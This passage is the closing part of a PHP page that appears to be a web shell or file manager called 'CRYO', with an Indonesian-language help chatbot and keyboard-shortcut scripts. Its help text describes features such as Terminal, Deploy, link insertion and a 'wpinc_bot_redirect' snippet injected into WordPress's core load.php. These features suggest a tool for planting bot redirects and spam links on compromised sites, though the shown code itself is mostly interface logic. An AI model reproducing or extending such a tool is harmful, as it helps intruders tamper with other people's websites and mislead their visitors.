                      '<strong>Nonaktifkan:</strong> di panel &quot;Snippet Aktif&quot;, klik tombol <code>OFF</code> di samping entry <code>wpinc_bot_redirect</code> - marker block dihapus, file load.php utuh.';
              }
          },
                    {
              keys: ['shortcut','keyboard','tombol','hotkey','pintas','pintasan'],
              reply: function() {
                  return '<strong><i class="fas fa-keyboard" style="color:#a5b4fc"></i> Keyboard Shortcuts:</strong><br><br>' +
                      '<code>Backspace</code>  Back ke parent folder<br>' +
                      '<code>Esc</code>  Tutup modal yang sedang terbuka (atau panel CRYO Assistant)<br><br>' +
                      '<em>Catatan:</em> Backspace tidak aktif saat kursor berada di kolom input/editor. Esc tetap aktif walau di dalam input agar mudah menutup modal.';
              }
          },
          {
              keys: ['role','akses','teman','admin','hak'],
              reply: function() {
                  return '<strong>Role & Akses:</strong><br><br>' +
                      'Role kamu saat ini: <code>' + CTX.role + '</code><br><br>' +
                      '<strong>Admin:</strong> Akses penuh  semua fitur tersedia<br>' +
                      '<strong>Teman:</strong> Akses terbatas  tidak bisa hapus/edit <code>.htaccess</code>, tidak bisa akses Terminal, WordPress tools, Deploy, dan Redirect';
              }
          },
          {
              keys: ['download','unduh','cara download'],
              reply: function() {
                  return '<strong>Cara Download File:</strong><br><br>' +
                      '" Klik tombol <code>download</code> () di samping file<br>' +
                      '" File akan langsung terunduh ke komputer<br><br>' +
                      '<strong>Download Folder:</strong><br>' +
                      '" Pilih folder dengan checkbox<br>' +
                      '" Klik <code>ZIP Selected</code> untuk zip dulu<br>' +
                      '" Lalu download file ZIP-nya';
              }
          },
          {
              keys: ['copy','salin','duplicate','duplikat'],
              reply: function() {
                  return '<strong>Copy / Duplikat File:</strong><br><br>' +
                      'Saat ini fitur copy tersedia via <strong>Terminal</strong>:<br>' +
                      '" <code>cp file.txt file_copy.txt</code>  copy file<br>' +
                      '" <code>cp -r folder/ folder_copy/</code>  copy folder<br>' +
                      '" <code>cp file.txt /path/tujuan/</code>  copy ke folder lain';
              }
          },
          {
              keys: ['search','cari','find','cari file'],
              reply: function() {
                  return '<strong>Cari File:</strong><br><br>' +
                      'Gunakan <strong>Terminal</strong> untuk mencari file:<br>' +
                      '" <code>find . -name "*.php"</code>  cari file PHP<br>' +
                      '" <code>find . -name "config*"</code>  cari file awalan config<br>' +
                      '" <code>grep -r "kata" .</code>  cari isi file yang mengandung kata<br>' +
                      '" <code>find . -size +10M</code>  cari file > 10MB<br>' +
                      '" <code>find . -mtime -1</code>  file diubah 24 jam terakhir';
              }
          }
      ];

      function matchReply(input) {
          const q = input.toLowerCase().trim();
          if (!q) return null;
          let best = null;
          let bestScore = 0;
          for (let i = 0; i < KB.length; i++) {
              for (let j = 0; j < KB[i].keys.length; j++) {
                  const key = KB[i].keys[j];
                  if (q === key) return KB[i].reply();
                  if (q.indexOf(key) !== -1 || key.indexOf(q) !== -1) {
                      const score = key.length;
                      if (score > bestScore) {
                          bestScore = score;
                          best = KB[i].reply();
                      }
                  }
              }
          }
          if (best) return best;
          const words = q.split(/\s+/);
          for (let i = 0; i < KB.length; i++) {
              for (let j = 0; j < KB[i].keys.length; j++) {
                  for (let w = 0; w < words.length; w++) {
                      if (words[w].length > 2 && KB[i].keys[j].indexOf(words[w]) !== -1) {
                          return KB[i].reply();
                      }
                  }
              }
          }
          return null;
      }

      function addMsg(html, type) {
          const chat = document.getElementById('cryoChat');
          const div = document.createElement('div');
          div.className = 'cryo-msg cryo-msg-' + type;
          div.innerHTML = html;
          chat.appendChild(div);
          chat.scrollTop = chat.scrollHeight;
      }

      window.sendQ = function(q) {
          document.getElementById('cryoInput').value = '';
          addMsg(q, 'user');
          setTimeout(function() {
              const r = matchReply(q);
              addMsg(r || 'Maaf, saya belum mengerti pertanyaan itu. Coba keyword lain seperti: <code>upload</code>, <code>terminal</code>, <code>permission</code>, <code>trash</code>, <code>server info</code>, <code>fitur</code>, <code>sisip link</code>, <code>wpinc</code><div class="cryo-quick"><button onclick="sendQ(&#39;help&#39;)">Lihat Bantuan</button></div>', 'bot');
          }, 300);
      };

      window.sendCryoMsg = function() {
          const input = document.getElementById('cryoInput');
          const q = input.value.trim();
          if (!q) return;
          input.value = '';
          window.sendQ(q);
      };

      window.toggleCryoAssistant = function() {
          const panel = document.getElementById('cryoAssistantPanel');
          if (panel.style.display === 'none' || panel.style.display === '') {
              panel.style.display = 'flex';
              document.getElementById('cryoInput').focus();
              if (!panel.dataset.init) {
                  panel.dataset.init = '1';
                  addMsg('Halo! Saya <strong>CRYO Assistant</strong>.<br>Ada yang bisa saya bantu?<div class="cryo-quick"><button onclick="sendQ(&#39;help&#39;)">Lihat Bantuan</button><button onclick="sendQ(&#39;server info&#39;)">Server Info</button><button onclick="sendQ(&#39;folder ini&#39;)">Folder Ini</button><button onclick="sendQ(&#39;fitur&#39;)">Fitur</button></div>', 'bot');
              }
          } else {
              panel.style.display = 'none';
          }
      };
  })();
  </script>
  

  <!-- CRYO Keyboard Shortcuts -->
  <script>
  (function(){
    function inEditable(el){
      if (!el) return false;
      var t = (el.tagName || '').toUpperCase();
      if (t === 'INPUT' || t === 'TEXTAREA' || t === 'SELECT') return true;
      if (el.isContentEditable) return true;
      // CodeMirror editor
      if (el.closest && el.closest('.CodeMirror')) return true;
      return false;
    }
    function anyModalOpen(){
      var sel = document.querySelectorAll('[id$="Modal"]');
      for (var i=0; i<sel.length; i++){
        var st = window.getComputedStyle(sel[i]).display;
        if (st && st !== 'none') return sel[i];
      }
      return null;
    }
    function closeTopModal(){
      var m = anyModalOpen();
      if (m){ m.style.display = 'none'; return true; }
      return false;
    }
    document.addEventListener('keydown', function(e){
        // Esc = tutup modal teratas (atau panel CRYO Assistant). Bekerja walau di dalam input.
        if (e.key === 'Escape') {
          if (closeTopModal()) { e.preventDefault(); return; }
          var ap = document.getElementById('cryoAssistantPanel');
          if (ap && ap.style.display && ap.style.display !== 'none') {
            ap.style.display = 'none'; e.preventDefault(); return;
          }
        }
        // Backspace = back ke parent folder. Skip kalau user mengetik di input/editor.
        if (e.key === 'Backspace') {
          if (inEditable(e.target)) return;
          e.preventDefault();
          history.back();
        }
      }, false);
  
      // Backup ESC handler (capture phase) khusus untuk menutup modal apa pun
      window.addEventListener('keydown', function(e){
          if (e.key !== 'Escape' && e.keyCode !== 27) return;
          var sel = document.querySelectorAll('[id$="Modal"], .modal');
          var closed = false;
          for (var i=0; i<sel.length; i++){
              try {
                  var st = window.getComputedStyle(sel[i]).display;
                  if (st && st !== 'none') { sel[i].style.display = 'none'; closed = true; }
              } catch(_) {}
          }
          if (closed) e.preventDefault();
      }, true);
    })();
  </script>
  </body>
</html>
<?php
ob_end_flush();
?>